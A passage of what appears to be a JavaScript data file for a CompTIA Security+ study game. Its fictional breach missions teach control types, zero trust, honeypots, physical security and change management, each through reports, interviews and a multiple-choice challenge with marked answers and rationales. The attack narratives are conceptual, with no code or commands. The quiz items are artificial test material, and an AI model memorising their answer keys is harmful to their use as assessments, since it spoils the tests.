    escalation: 'The leaked product roadmap reached a competitor through the client. Two planned features appeared in the competitor\'s next product announcement, eliminating your company\'s first-mover advantage. Legal estimates the competitive damage at $1.5M in lost market opportunity. The board mandates an immediate transition from DAC to RBAC with mandatory file classification labels.',

    refs: [
      { source: 'Study Guide', section: '4.6 - Access Controls', page: 77 },
      { source: 'Study Guide', section: '5.1 - Data Roles and Responsibilities', page: 87 }
    ]
  },

// ============================================================
  // DOMAIN 1 — General Security Concepts (Obj 1.1)
  // Teaches: Security Control Categories and Types
  // ============================================================
  {
    id: 'MISSION-006',
    title: 'The Undefended Perimeter',
    domain: 'General Security Concepts',
    objectiveCodes: ['1.1'],
    threatLevel: 'critical',
    tags: ['Security Controls', 'Defense in Depth', 'Control Categories', 'Control Types'],
    briefing: `EMERGENCY BOARD BRIEFING: Your company suffered a ransomware breach last night. The attacker entered through a phishing email, moved laterally through the network, escalated privileges, exfiltrated 2TB of customer data, and encrypted 80% of production servers. A post-incident forensic review reveals a devastating finding: the organization had almost no layered security controls. Each defensive layer that should have stopped the attack was either missing or misconfigured. The board wants to understand: what controls should have been in place, and why weren't they?`,

    intel: [
      {
        id: 'ctrl-01',
        type: 'report',
        label: 'Forensic Timeline Analysis',
        content: `ATTACK CHAIN RECONSTRUCTION:

Phase 1 — Initial Access (14:22):
  - Phishing email bypassed spam filter (no email security gateway)
  - Employee clicked malicious link, downloaded trojan
  - No endpoint detection and response (EDR) on workstation
  - No application whitelisting to block unauthorized executables

Phase 2 — Lateral Movement (14:35):
  - Attacker scanned internal network (no network segmentation)
  - Pivoted from workstation to file server (no micro-segmentation)
  - No intrusion detection system (IDS) detected the scanning activity

Phase 3 — Privilege Escalation (15:10):
  - Exploited unpatched domain controller (no vulnerability management)
  - Harvested admin credentials from memory (no credential vaulting)
  - No privileged access management (PAM) system in place

Phase 4 — Exfiltration and Impact (15:45-18:30):
  - Exfiltrated 2TB to external server (no data loss prevention)
  - Deployed ransomware to 200+ servers (no backup isolation)
  - No incident response plan was followed (no documented procedures)

Every phase succeeded because a security control that should have been there simply didn't exist. This is the opposite of defense in depth — a single point of failure at each stage.`,
        critical: true
      },
      {
        id: 'ctrl-02',
        type: 'report',
        label: 'Security Control Framework',
        content: `SECURITY CONTROL CATEGORIES (CompTIA Objective 1.1):

Security controls fall into FOUR categories based on how they're implemented:

1. TECHNICAL CONTROLS (technology-based):
   - Firewalls, encryption, antivirus, IDS/IPS, MFA
   - Implemented through hardware or software
   - Example: Firewall blocking port 445 is a technical control

2. MANAGERIAL CONTROLS (administrative):
   - Policies, procedures, risk assessments, security training
   - Implemented through documentation and oversight
   - Example: Security awareness training program is a managerial control

3. OPERATIONAL CONTROLS (people-focused processes):
   - Security guards, background checks, configuration management
   - Implemented through day-to-day procedures performed by people
   - Example: Guards checking badges at entrance is an operational control

4. PHYSICAL CONTROLS (tangible barriers):
   - Fences, locks, cameras, mantraps, bollards
   - Implemented through physical barriers and deterrents
   - Example: Locked server room door is a physical control

Your organization had severe gaps across ALL categories. Most controls either weren't deployed or weren't functioning.`,
        critical: true
      },
      {
        id: 'ctrl-03',
        type: 'report',
        label: 'Security Control Types',
        content: `SECURITY CONTROL TYPES (what they DO):

Controls are also classified by their FUNCTION:

1. PREVENTIVE — Stop attacks before they happen
   - Examples: Firewall blocks malicious IPs, MFA prevents unauthorized login, door locks prevent physical access
   - Your gap: No email gateway to PREVENT phishing delivery

2. DETECTIVE — Identify attacks in progress or after the fact
   - Examples: IDS alerts on scanning, SIEM detects anomalies, cameras record intrusions
   - Your gap: No IDS to DETECT lateral movement scanning

3. CORRECTIVE — Fix problems after an incident
   - Examples: Restoring from backup, patching vulnerabilities, revoking compromised credentials
   - Your gap: Backups existed but weren't isolated — ransomware encrypted them too

4. DETERRENT — Discourage attackers
   - Examples: Warning banners, visible cameras, security awareness training
   - Your gap: No security training to DETER employees from clicking phishing links

5. COMPENSATING — Alternative control when primary control isn't feasible
   - Examples: Network segmentation when you can't patch, MFA when password policy is weak
   - Your gap: No compensating controls for unpatched systems

6. DIRECTIVE — Compel or encourage compliance
   - Examples: Policies, security standards, mandatory training, NDAs
   - Your gap: No acceptable use policy requiring employees to report suspicious emails

Defense in depth requires LAYERING controls of different types and categories. If one fails, others catch what it missed.`,
        critical: false
      },
      {
        id: 'ctrl-04',
        type: 'forensic',
        label: 'Missing Controls Inventory',
        content: `CONTROLS THAT SHOULD HAVE EXISTED:

PREVENTIVE Technical: Email security gateway, application whitelisting, EDR
PREVENTIVE Physical: Badge access to server room (attacker accessed physical servers)
PREVENTIVE Managerial: Patch management policy

DETECTIVE Technical: IDS/IPS, SIEM with correlation rules, file integrity monitoring
DETECTIVE Operational: Security operations center (SOC) monitoring

CORRECTIVE Technical: Isolated offline backups, automated incident response playbooks
CORRECTIVE Managerial: Incident response plan

DETERRENT Managerial: Security awareness training
DETERRENT Physical: Surveillance cameras with monitoring

COMPENSATING Technical: Network segmentation (when patching isn't immediate)

DIRECTIVE Managerial: Acceptable use policy, data classification policy

The audit found that 18 of 22 baseline security controls recommended by NIST Cybersecurity Framework were either not implemented or not enforced. This created a Swiss cheese effect — every layer had holes, and the holes aligned perfectly for the attacker.`,
        critical: false
      },
      {
        id: 'ctrl-05',
        type: 'witness',
        label: 'CISO Interview',
        content: `Interview with Chief Information Security Officer:

"I've been requesting budget for these controls for three years. Last year I proposed an email security gateway (preventive technical control), an IDS (detective technical control), and mandatory security awareness training (deterrent managerial control). The finance committee denied all three, saying we'd never been breached before so the risk was theoretical.

I warned them that relying on antivirus alone was a single point of failure. Antivirus is a preventive technical control, but it only stops KNOWN malware. The phishing trojan was a zero-day — antivirus didn't recognize it. That's why you need multiple control types: if preventive fails, detective should catch it. If detective misses it, corrective should limit the damage.

The board is asking why we didn't have these controls. The answer is: I asked for them and was told no. Security controls have a cost, but breaches cost more. We just learned that lesson the hard way."`,
        critical: false
      }
    ],

    challenge: {
      question: 'The attacker scanned the internal network for vulnerable systems. What category and type of control should have DETECTED this activity?',
      options: [
        'Preventive Physical Control — security cameras',
        'Detective Technical Control — intrusion detection system',
        'Corrective Managerial Control — incident response plan',
        'Deterrent Operational Control — security guard patrols'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: Security cameras are a detective PHYSICAL control. They detect physical intrusions, not network scanning activity. Category mismatch (physical, not technical) and cameras operate in physical space, not on the network.',
        'CORRECT: An IDS is a DETECTIVE (identifies attacks in progress) TECHNICAL (implemented through software/hardware) control. It monitors network traffic for suspicious patterns like port scanning and alerts the SOC. This is exactly what should have caught the lateral movement.',
        'INCORRECT: An incident response plan is a corrective MANAGERIAL control. It helps you respond AFTER detection, but it doesn\'t detect anything. You need detective controls (like IDS) to feed information into your IR plan.',
        'INCORRECT: Security guards are an operational control. They patrol physical areas, not digital networks. Network scanning happens at the technical layer and requires technical detective controls like IDS/IPS or SIEM.'
      ]
    },

    debrief: `This breach exposes CompTIA Objective 1.1: Security Controls. Controls are classified by CATEGORY (how they're implemented) and TYPE (what they do).

Categories: Technical (firewalls, encryption), Managerial (policies, training), Operational (guards, procedures), Physical (locks, fences).

Types: Preventive (block attacks), Detective (identify attacks), Corrective (fix damage), Deterrent (discourage attackers), Compensating (alternative when primary fails), Directive (enforce compliance).

Defense in depth layers MULTIPLE controls. If the preventive email gateway had existed, the phishing email never arrives. If detective IDS had existed, lateral movement gets caught. If corrective isolated backups had existed, you could recover. Each missing control was a missed opportunity to stop the attack.`,

    escalation: `The ransomware encrypted all servers including the backup domain controller because backups weren't isolated (no corrective control). Recovery takes 6 weeks. Customer data was exfiltrated and posted on a leak site (no detective DLP). The company faces $4.2M in regulatory fines, $8M in recovery costs, and a class-action lawsuit. The CISO resigns. The board approves an emergency $2M security budget — 18 months too late.`,

    refs: [
      { source: 'Study Guide', section: '1.1 - Security Controls', page: 1 },
      { source: 'Study Guide', section: '5.1 - Security Governance', page: 85 }
    ]
  },

  // ============================================================
  // DOMAIN 1 — General Security Concepts (Obj 1.2)
  // Teaches: Zero Trust, AAA Framework, Non-repudiation, Gap Analysis
  // ============================================================
  {
    id: 'MISSION-007',
    title: 'The Insider Breach',
    domain: 'General Security Concepts',
    objectiveCodes: ['1.2'],
    threatLevel: 'high',
    tags: ['Zero Trust', 'AAA', 'Insider Threat', 'Micro-segmentation', 'Gap Analysis'],
    briefing: `INCIDENT ALERT: At 3:47 AM, your data loss prevention system flagged a massive exfiltration event — 340GB of proprietary R&D data transferred to an external cloud storage service. The source: a developer workstation belonging to Marcus Chen, a senior engineer with 8 years at the company. By the time your SOC noticed, the data was gone. The IR team traced the activity back and discovered something disturbing: the attack succeeded because your network implicitly trusted all internal traffic. Once Marcus's credentials were compromised, the attacker had free reign across the entire internal network. Zero trust architecture wasn't implemented. The CISO wants to know: what gaps allowed this, and how does zero trust prevent it?`,

    intel: [
      {
        id: 'zt-01',
        type: 'log',
        label: 'Authentication Logs',
        content: `AUTHENTICATION TIMELINE:

02:15 — User "mchen" authenticated to VPN from IP 198.51.100.45 (residential ISP, Philippines)
  - Valid username + password (AUTHENTICATION successful)
  - No MFA required for VPN access
  - No geolocation check (Marcus normally connects from California)
  - VPN granted full internal network access

02:22 — User "mchen" accessed file server FS-RESEARCH-01
  - No re-authentication required (already inside the perimeter)
  - AUTHORIZATION check: User is in "Engineering" group → ALLOW
  - No continuous verification of user identity

02:47 — User "mchen" accessed database DB-PATENTS-PROD
  - No re-authentication required
  - AUTHORIZATION: User has "db_datareader" role → ALLOW
  - Database logs the access (ACCOUNTING/AUDIT)

03:47 — DLP alert triggered on 340GB outbound transfer

This is the traditional "castle and moat" security model: strong perimeter (VPN authentication), but once inside, everything is trusted. The network assumed: "If you passed the VPN login, you must be legitimate." It never re-verified identity or checked context.`,
        critical: true
      },
      {
        id: 'zt-02',
        type: 'report',
        label: 'Zero Trust Architecture Principles',
        content: `ZERO TRUST ARCHITECTURE (CompTIA Objective 1.2):

Core principle: "NEVER TRUST, ALWAYS VERIFY"
Traditional security: Trust the inside, distrust the outside
Zero Trust: Trust NOTHING by default — verify every access attempt

Key concepts:

1. CONTROL PLANE vs DATA PLANE:
   - Control Plane: Makes access decisions (policy engine, authentication, authorization)
   - Data Plane: Enforces decisions (firewalls, proxies, gateways that allow/block traffic)
   - In this attack: VPN was the control plane (made initial auth decision). But there was no ongoing data plane enforcement INSIDE the network.

2. MICRO-SEGMENTATION:
   - Divide network into tiny isolated zones
   - Every zone is a separate trust boundary
   - Accessing a new zone requires re-authentication/re-authorization
   - Example: Accessing the file server should require NEW verification, even if you're already on the VPN

3. POLICY-BASED ACCESS:
   - Access decisions based on: Identity + Device + Location + Time + Risk score
   - Not just "Are you authenticated?" but "Are you the RIGHT user, on the RIGHT device, from the RIGHT location, at the RIGHT time, accessing the RIGHT resource?"

In a zero trust architecture, the attacker would have faced verification challenges at EVERY step: VPN login, file server access, database access, outbound data transfer. Each would require fresh proof of legitimacy.`,
        critical: true
      },
      {
        id: 'zt-03',
        type: 'forensic',
        label: 'AAA Framework Analysis',
        content: `AAA FRAMEWORK BREAKDOWN (Authentication, Authorization, Accounting):

AUTHENTICATION — "Who are you?"
  - Proving identity (username/password, MFA, biometrics, certificates)
  - Your implementation: Password-only VPN login
  - Gap: No MFA, no device verification, no geolocation checks
  - Zero Trust would require: MFA + device certificate + geolocation validation

AUTHORIZATION — "What are you allowed to do?"
  - Determining permissions (ACLs, role-based access, policy evaluation)
  - Your implementation: Group membership checked ONCE at VPN login, then implicit trust
  - Gap: No continuous authorization checks inside the network
  - Zero Trust would require: Policy evaluation at EVERY resource access (least privilege, need-to-know)

ACCOUNTING (also called AUDITING) — "What did you do?"
  - Logging and monitoring (audit trails, SIEM correlation, alerting)
  - Your implementation: Logs existed but no real-time correlation
  - Gap: 340GB exfiltration took 90 minutes before DLP alert fired
  - Zero Trust would require: Real-time behavioral analytics flagging unusual access patterns immediately

Your AAA implementation checked "who" once at the door, then stopped verifying. Zero trust checks "who + what + where + when + how" at every step and continuously monitors for anomalies.`,
        critical: false
      },
      {
        id: 'zt-04',
        type: 'report',
        label: 'Gap Analysis Findings',
        content: `SECURITY GAP ANALYSIS REPORT:

A gap analysis compares your CURRENT state with a DESIRED secure state, identifies gaps, and prioritizes remediation.

CURRENT STATE (Traditional Perimeter Model):
  ✓ VPN with password authentication
  ✓ Role-based authorization via Active Directory groups
  ✓ Audit logging enabled
  ✗ No MFA
  ✗ No device posture validation
  ✗ No micro-segmentation inside the perimeter
  ✗ No continuous authentication/authorization
  ✗ No behavioral analytics or anomaly detection
  ✗ No data plane enforcement between internal zones

DESIRED STATE (Zero Trust Architecture):
  ✓ MFA required for all access
  ✓ Device health/compliance verification
  ✓ Micro-segmented network with policy enforcement at every boundary
  ✓ Continuous risk-based authentication
  ✓ Real-time behavioral analytics with automated response
  ✓ Data plane enforcement (software-defined perimeter, microsegmentation firewalls)

GAPS IDENTIFIED:
  Priority 1 (Critical): No MFA, no micro-segmentation
  Priority 2 (High): No device posture checks, no continuous auth
  Priority 3 (Medium): No behavioral analytics, insufficient real-time monitoring

REMEDIATION PLAN:
  Phase 1: Deploy MFA for VPN, implement network micro-segmentation
  Phase 2: Add device compliance checks, deploy software-defined perimeter
  Phase 3: Implement user/entity behavioral analytics (UEBA), automate threat response`,
        critical: false
      },
      {
        id: 'zt-05',
        type: 'witness',
        label: 'Incident Response Interview',
        content: `Interview with Marcus Chen (victim of credential theft):

"I received a phishing email three days ago that looked like it was from IT. It said my VPN password was expiring and to click the link to reset it. I clicked, entered my credentials on what I thought was the company portal. That must be when they got my password.

I had no idea my account was being used overnight from the Philippines. Why didn't the system flag that as suspicious? I NEVER work at 3 AM, and I've never connected from outside the US.

If the system required MFA or checked my location or asked for additional verification when accessing sensitive data, the attacker couldn't have gotten in with just my password. I understand now why zero trust is important — you can't just assume everyone inside the network is legitimate."

NON-REPUDIATION NOTE: The audit logs prove "mchen" account accessed the data (accounting/auditing function of AAA). But because there was no MFA or device verification, we CANNOT prove it was actually Marcus — it could have been anyone with his stolen password. Strong authentication (MFA, device certs) provides non-repudiation — cryptographic proof of WHO performed an action.`,
        critical: false
      }
    ],

    challenge: {
      question: 'In a zero trust architecture, what would have prevented the attacker from accessing the research file server even after compromising the VPN password?',
      options: [
        'Firewall rules blocking all inbound traffic from external IPs',
        'Micro-segmentation requiring re-authentication at each resource boundary',
        'Antivirus scanning all downloaded files for malware',
        'Network intrusion prevention blocking SQL injection attempts'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: Firewall rules protect the perimeter, but once the attacker authenticated via VPN, they were INSIDE. Traditional firewalls don\'t enforce zero trust inside the network. The attacker wasn\'t connecting from external IPs — they were using the legitimate VPN.',
        'CORRECT: Micro-segmentation treats every internal resource as a separate trust boundary. Even though the attacker passed VPN authentication, accessing the file server would require NEW verification — likely MFA, device posture check, and policy evaluation. Without these, access is denied. This is zero trust: never trust, always verify, at every step.',
        'INCORRECT: Antivirus is a preventive control for malware. It doesn\'t verify user identity or enforce access policies. The attacker didn\'t download malware — they used stolen credentials to access data.',
        'INCORRECT: IPS blocks known attack patterns like SQL injection or exploit attempts. This was not a technical exploit — it was authenticated access using stolen credentials. IPS operates at the network/application layer, not the identity/access layer.'
      ]
    },

    debrief: `This incident demonstrates CompTIA Objective 1.2: Zero Trust Architecture and AAA Framework.

Zero Trust: "Never trust, always verify." Every access request is authenticated, authorized, and logged regardless of network location. Micro-segmentation divides the network into isolated zones with policy enforcement at every boundary. Control plane makes decisions; data plane enforces them.

AAA Framework:
- Authentication: Verify identity (MFA, device checks, geolocation)
- Authorization: Enforce least privilege access policies
- Accounting: Log all activity for audit and anomaly detection

Gap Analysis: Compare current state vs. desired state, identify security gaps, prioritize fixes.

The traditional perimeter model failed because it trusted internal traffic. Zero trust would require continuous verification at every resource access, making stolen credentials far less useful to attackers.`,

    escalation: `The exfiltrated 340GB included three years of R&D for an unreleased product. Two weeks later, a competitor announces a suspiciously similar product. Legal estimates competitive damages at $12M. Regulatory investigation reveals the lack of MFA violates cyber insurance policy requirements — the $5M policy claim is denied. The company must now fund the entire incident response, forensics, customer notification, and regulatory fines out of pocket. Total cost: $18M. The board mandates immediate zero trust implementation.`,

    refs: [
      { source: 'Study Guide', section: '1.2 - Zero Trust', page: 6 },
      { source: 'Study Guide', section: '4.6 - AAA and Authentication', page: 73 }
    ]
  },

  // ============================================================
  // DOMAIN 1 — General Security Concepts (Obj 1.2)
  // Teaches: Physical Security and Deception Technologies
  // ============================================================
  {
    id: 'MISSION-008',
    title: 'The Honeypot Incident',
    domain: 'General Security Concepts',
    objectiveCodes: ['1.2'],
    threatLevel: 'medium',
    tags: ['Physical Security', 'Deception', 'Honeypots', 'Access Control', 'Tailgating'],
    briefing: `SECURITY ALERT: Your network security team deployed a honeypot server last month — a decoy system designed to attract and detect attackers. This morning, the honeypot logged suspicious activity: someone accessed it from INSIDE the corporate network and attempted to copy sensitive-looking (fake) files. The source IP traces to a workstation in the data center itself. Physical access logs show no authorized entry to the server room during that time window. Your security director suspects someone tailgated into the restricted area. The investigation reveals gaps in both physical security and network deception strategy.`,

    intel: [
      {
        id: 'honey-01',
        type: 'alert',
        label: 'Honeypot Activity Log',
        content: `HONEYPOT DETECTION ALERT:

Honeypot: DECOY-FIN-SERVER-01 (10.10.50.99)
Purpose: Fake financial server with honeytokens (decoy files containing tracking data)

Activity detected:
  04:22:15 — SMB connection from 10.10.50.5 (workstation in server room)
  04:23:40 — Directory listing of share "Financial_Reports_2025"
  04:24:10 — File access: Q4_Executive_Salaries.xlsx (HONEYFILE)
  04:24:55 — File copied to USB device
  04:25:30 — Connection terminated

DECEPTION TECHNOLOGIES (CompTIA Objective 1.2):

HONEYPOT: A decoy system that looks like a real server. It has no legitimate business use — ANY access is suspicious. Honeypots attract attackers and alert security teams.

HONEYFILE: A fake file with enticing names (like "Executive_Salaries.xlsx"). When accessed, it triggers an alert. Some honeyfiles contain honeytokens — unique tracking data that "phones home" if the file is opened elsewhere.

HONEYTOKEN: Fake data (credentials, API keys, database records) embedded in systems. When used, it alerts security. Example: A fake admin password in a config file. If anyone tries to use it, you know they're snooping.

HONEYNET: An entire network of decoy systems. More elaborate than a single honeypot — simulates a realistic environment to study attacker behavior.

Purpose: Deception tech detects attackers who bypassed preventive controls. It's a DETECTIVE control — it doesn't block attacks, it reveals them.`,
        critical: true
      },
      {
        id: 'honey-02',
        type: 'log',
        label: 'Physical Access Logs',
        content: `BADGE ACCESS SYSTEM — Server Room Door:

Authorized personnel for Data Center access: 6 employees
Last 24 hours:

  02:00 — Badge scan: J. Rodriguez (Network Admin) — AUTHORIZED
  02:15 — Door closed (magnetic lock engaged)
  06:30 — Badge scan: M. Patel (Systems Admin) — AUTHORIZED
  06:45 — Door closed

GAP IDENTIFIED: No badge scan logged between 04:00-05:00, but workstation in server room (10.10.50.5) was actively used at 04:22. Someone was inside without badging in.

PHYSICAL SECURITY CONTROLS (CompTIA Objective 1.2):

ACCESS CONTROL VESTIBULE (MANTRAP): A double-door system where you must badge through the first door, wait in a small room, then badge through the second door. Only one door can be open at a time. Prevents tailgating (following someone through a door without badging).
  - Your gap: Single door with badge reader. No mantrap.

TAILGATING: Following an authorized person through a secure door without using your own credentials. Also called "piggybacking."
  - Your gap: J. Rodriguez badged in at 02:00. Someone likely followed him through the door without badging.

VIDEO SURVEILLANCE: Cameras recording entrances, exits, and sensitive areas.
  - Your gap: Camera exists but was OFFLINE for maintenance (noted in facilities log).

Your physical security had a single point of failure: one badge reader, no mantrap, no working camera.`,
        critical: true
      },
      {
        id: 'honey-03',
        type: 'forensic',
        label: 'Additional Physical Security Measures',
        content: `PHYSICAL SECURITY CONTROLS REFERENCE:

BOLLARDS: Heavy posts (concrete or steel) placed outside buildings to prevent vehicle ramming attacks. Protect against car/truck-based intrusions.
  - Your implementation: Bollards installed outside main entrance (ADEQUATE)

FENCING: Perimeter barrier (chain-link, wrought iron, or concrete) with barbed wire or anti-climb features. First layer of physical defense.
  - Your implementation: 6-foot chain-link fence around facility (ADEQUATE)

SECURITY GUARDS: Human personnel who verify identity, patrol, and respond to incidents. Can detect tailgating (badge readers can't).
  - Your gap: No guard stationed at server room entrance. Guards only patrol perimeter.

ACCESS BADGES: RFID or magnetic stripe cards. Must be used in combination with mantrap to prevent tailgating.
  - Your implementation: Badges required, but single-door system allows tailgating

LIGHTING: Bright illumination of entrances, parking lots, and perimeters. Deters intruders and aids camera surveillance.
  - Your implementation: Adequate exterior lighting, but server room hallway lighting was DIM

The server room had physical access controls (badge reader, locked door) but lacked LAYERED defenses. No mantrap meant tailgating was easy. No guard meant no human verification. Offline camera meant no video evidence. This is the opposite of defense in depth.`,
        critical: false
      },
      {
        id: 'honey-04',
        type: 'report',
        label: 'Additional Deception Technologies',
        content: `DECEPTION TECHNOLOGIES DEEP DIVE:

DNS SINKHOLE:
  - A DNS server that returns false IP addresses for known-malicious domains
  - Malware trying to reach its command-and-control (C2) server gets redirected to a non-existent IP or to a honeypot
  - Used to block malware communication and detect infected systems
  - Example: If malware tries to resolve "evil-c2-server.com", the sinkhole returns 0.0.0.0, blocking communication
  - Your implementation: DNS sinkhole active on corporate DNS — successfully blocked 3 malware C2 attempts last month

HONEYPOT USE CASE — What happened here:
  - The honeypot detected INSIDER activity (not external)
  - Legitimate users have no reason to access decoy systems
  - ANY access to the honeypot is a red flag — either malicious insider, compromised account, or unauthorized physical access
  - The honeyfile copied to USB contained a honeytoken — a unique identifier embedded in the spreadsheet. If opened on another system, it "calls home" via an embedded image that loads from a tracking server. This will reveal where the stolen file goes.

The honeypot worked perfectly — it detected the unauthorized access. The PHYSICAL controls failed to prevent the tailgating that made the access possible.`,
        critical: false
      },
      {
        id: 'honey-05',
        type: 'witness',
        label: 'Interview: Network Administrator',
        content: `Interview with J. Rodriguez (Network Admin who badged in at 02:00):

"I was called in overnight to fix a switch firmware issue. I badged into the server room at 2 AM. The hallway lighting was really dim — I could barely see. I heard someone behind me but assumed it was M. Patel or another admin, so I didn't turn around. I held the door open for a second thinking they had their badge ready.

I didn't realize I was being tailgated until security called me this morning. I never saw who it was. If there had been a mantrap, they couldn't have followed me through — the outer door has to close and lock before the inner door opens.

Looking back, I should have turned around and verified who it was, but at 2 AM, I wasn't thinking about security protocols. A security guard stationed there would have caught it. Or if the camera had been working, we'd have video of who followed me in."

LESSON: Physical security relies on human behavior (guards verifying identity) AND technical controls (mantraps preventing tailgating). Relying solely on badge readers assumes everyone will verify the person behind them — they won't.`,
        critical: false
      }
    ],

    challenge: {
      question: 'Which physical security control would have been MOST effective at preventing the tailgating incident?',
      options: [
        'Bollards outside the building entrance',
        'Access control vestibule (mantrap) at the server room',
        'Increased perimeter fence height to 8 feet',
        'DNS sinkhole on the corporate network'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: Bollards prevent vehicle ramming attacks. They have zero effect on a person tailgating through an interior door. Bollards are exterior physical controls for vehicle-based threats.',
        'CORRECT: A mantrap (access control vestibule) requires authentication at TWO sequential doors. You badge through door 1, it locks behind you, then you badge through door 2. Only one door can open at a time. Tailgating becomes impossible — the first door must close and lock before the second opens. This is the standard physical control for high-security areas.',
        'INCORRECT: Perimeter fencing controls access to the FACILITY grounds, not internal server room access. The tailgating happened inside the building. Fence height is irrelevant to interior access control.',
        'INCORRECT: A DNS sinkhole is a DECEPTION/NETWORK control that blocks malware C2 communication. It has nothing to do with physical access control. This was a physical security failure, not a network security failure.'
      ]
    },

    debrief: `This investigation covers CompTIA Objective 1.2: Physical Security and Deception Technologies.

Physical Security Controls:
- Bollards: Prevent vehicle attacks
- Mantraps (access control vestibules): Prevent tailgating with dual-door authentication
- Fencing: Perimeter barrier
- Surveillance: Cameras with monitoring/recording
- Guards: Human verification and response
- Badges: RFID/magnetic access credentials
- Lighting: Deter intrusions, aid surveillance

Deception Technologies (detective controls):
- Honeypot: Decoy system that alerts when accessed
- Honeyfile: Fake file that triggers alerts
- Honeytoken: Fake credential/data that "calls home" when used
- Honeynet: Network of decoy systems
- DNS Sinkhole: Redirects malware C2 traffic to block communication

The honeypot worked — it detected the intrusion. Physical controls failed — no mantrap, no guard, offline camera.`,

    escalation: `The honeytoken embedded in the stolen file triggered an alert 18 hours later when opened on a home laptop registered to a janitorial contractor with building access but NOT server room authorization. The contractor was attempting to sell "company financial data" on the dark web, not realizing the data was fake. Law enforcement arrested the individual. However, the incident exposed a vendor management gap — contractor background checks had expired. The company must now re-screen all vendors and implement mantraps on all restricted areas.`,

    refs: [
      { source: 'Study Guide', section: '1.2 - Physical Security', page: 8 },
      { source: 'Study Guide', section: '2.4 - Deception Technologies', page: 35 }
    ]
  },

  // ============================================================
  // DOMAIN 1 — General Security Concepts (Obj 1.3)
  // Teaches: Change Management Process
  // ============================================================
  {
    id: 'MISSION-009',
    title: 'The Rogue Firmware',
    domain: 'General Security Concepts',
    objectiveCodes: ['1.3'],
    threatLevel: 'high',
    tags: ['Change Management', 'Configuration Management', 'Downtime', 'Backout Plan'],
    briefing: `CRITICAL OUTAGE: At 11:47 PM last night, your entire corporate network went dark. 200 employees showed up this morning to find no internet, no email, no file access — nothing works. The NOC traced the failure to the core network switch in the data center. Logs show someone updated the switch firmware at 11:43 PM. The new firmware version is incompatible with your routing configuration, causing a catastrophic failure. Worse: there's no approved change ticket for this update. Someone bypassed the change management process entirely. Your infrastructure director is demanding answers: who made the change, why wasn't it approved, and how do you prevent this from happening again?`,

    intel: [
      {
        id: 'chg-01',
        type: 'log',
        label: 'Change Management System Query',
        content: `CHANGE TICKET SEARCH RESULTS:

Search: "firmware" OR "switch" OR "core-network" in last 7 days
Results: 0 approved changes found

CHANGE MANAGEMENT PROCESS (CompTIA Objective 1.3):

A formal process to evaluate, approve, and track system modifications. Prevents unauthorized changes that could cause outages.

Required elements:
1. APPROVAL: Change Advisory Board (CAB) reviews and approves/rejects requests
2. OWNERSHIP: Specific person responsible for executing and rolling back if needed
3. STAKEHOLDERS: Notify all affected teams (network, security, applications, help desk)
4. IMPACT ANALYSIS: Evaluate risk — what systems are affected? What could go wrong?
5. TEST RESULTS: Proof that the change works in a non-production environment
6. BACKOUT PLAN: Step-by-step instructions to reverse the change if it fails
7. MAINTENANCE WINDOW: Scheduled time (usually off-hours) when downtime is acceptable

This firmware update had NONE of these. No ticket. No approval. No testing. No backout plan. No scheduled maintenance window. It was done on a Tuesday night during a critical month-end financial close. This is the definition of an unauthorized change.`,
        critical: true
      },
      {
        id: 'chg-02',
        type: 'forensic',
        label: 'Network Device Logs',
        content: `SWITCH AUDIT LOG — CORE-SW-01:

23:43:18 — Admin login: user "netadmin_backup" from 10.10.1.45
23:43:55 — Firmware upload initiated: CORESW-FW-v4.8.2.bin
23:51:22 — Firmware upload complete
23:51:30 — System reboot initiated
23:51:45 — BOOT FAILURE — incompatible firmware version
23:51:46 — Routing table CORRUPTED
23:51:47 — All VLANs DOWN
23:52:00 — Network connectivity LOST

TECHNICAL CHANGE MANAGEMENT COMPONENTS:

ALLOW LISTS / DENY LISTS (whitelisting/blacklisting):
  - Allow list: Only approved software/firmware versions can be installed
  - Deny list: Known-bad versions are blocked
  - Your gap: No allow list enforcement. Any firmware version could be uploaded.

RESTRICTED ACTIVITIES:
  - High-risk changes (firmware updates, firewall rule changes, DNS modifications) require CAB approval
  - Your gap: No technical enforcement. Any admin account could update firmware.

DOWNTIME:
  - Planned downtime: Scheduled maintenance window with stakeholder notification
  - Unplanned downtime: What you got — 11 hours of unexpected outage
  - Your gap: The firmware update happened with no planned downtime window.

SERVICE/APPLICATION RESTART REQUIREMENTS:
  - Some changes require restarting services or rebooting systems
  - Must be coordinated with application owners to avoid disrupting users
  - Your gap: Core switch reboot at 11:51 PM during month-end processing caused financial application failures.`,
        critical: true
      },
      {
        id: 'chg-03',
        type: 'report',
        label: 'Root Cause Analysis',
        content: `ROOT CAUSE INVESTIGATION:

WHO: User "netadmin_backup" account (generic shared account, not tied to individual)
WHAT: Firmware updated from v4.2.1 (stable) to v4.8.2 (incompatible)
WHEN: 23:43 on Tuesday night (no maintenance window scheduled)
WHY: Unknown — no change ticket exists, no communication to stakeholders
HOW: Direct login to switch, uploaded firmware, initiated reboot

CHANGE MANAGEMENT FAILURES:

1. NO OWNERSHIP: Shared "netadmin_backup" account used — can't identify individual responsible
   - Best practice: Individual accounts with accountability

2. NO IMPACT ANALYSIS: Firmware v4.8.2 is incompatible with current IOS routing configuration
   - Should have been caught in testing
   - Impact: Total network failure affecting 200 users, all applications, financial month-end close

3. NO TEST RESULTS: Firmware was never validated in a lab/dev environment
   - Should have tested: Boot process, VLAN configuration, routing table, failover behavior

4. NO BACKOUT PLAN: When firmware failed, team had no documented rollback procedure
   - Resulted in: 11 hours of trial-and-error recovery
   - Should have had: "If firmware fails, connect via console cable, interrupt boot, TFTP previous firmware from backup server"

5. NO MAINTENANCE WINDOW: Change made during business-critical period (month-end close)
   - Financial team was processing Q4 transactions — now delayed

6. NO STAKEHOLDER NOTIFICATION: Security, applications, help desk had no warning of potential downtime`,
        critical: false
      },
      {
        id: 'chg-04',
        type: 'witness',
        label: 'Interview: Junior Network Engineer',
        content: `Interview with Alex Morgan (Junior Network Engineer):

"It was me. I used the backup admin account because I didn't want to wait for CAB approval — the meeting isn't until Friday, and I wanted to get the firmware updated before the weekend. The vendor released v4.8.2 with security patches, and I thought I was being proactive.

I tested it on the LAB switch last week and it worked fine. I didn't realize the LAB is running a different IOS version than production. When I loaded the firmware on the production switch, it failed to boot because the configurations didn't match.

I panicked. I didn't have a backout plan written down — I thought I'd just reverse the commands if something went wrong. But the switch wouldn't boot at all. I couldn't even get to the CLI. I had to call the senior engineer at midnight, and it took him 11 hours to recover using console cable access and TFTP.

